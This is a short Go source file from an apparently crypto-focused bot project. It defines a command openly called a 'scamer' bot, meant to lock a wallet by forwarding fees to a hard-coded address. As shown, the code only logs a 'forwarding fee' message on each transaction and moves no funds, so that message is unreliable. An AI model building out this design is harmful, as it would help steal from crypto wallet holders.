package main

import (
	"log"

	"github.com/loic-roux-404/crypto-bots/cmd/bot/core"
	"github.com/loic-roux-404/crypto-bots/internal/model/tx"
	"github.com/loic-roux-404/crypto-bots/pkg/networks"
	"github.com/spf13/cobra"
)

func init() {
	core.InitChainCmd(&cobra.Command{
		Use:   "scamer",
		Short: "Scamer bot forwarding fees to another wallet",
	})
}

// Lock wallet by transfering fees on other wallet
func main() {
	core.ExecuteNetCmd()

	n := networks.GetNetwork()
	dest := "0xBe20D507fbdD6dAFd7a2ddE95c2d3f4618547F17"

	n.SubscribeCurrent().RunEventLoop(func(tx *tx.Adapter) {
		log.Printf("Info: Forwarding fee to %s", dest)
		tx.Log()
	})
}
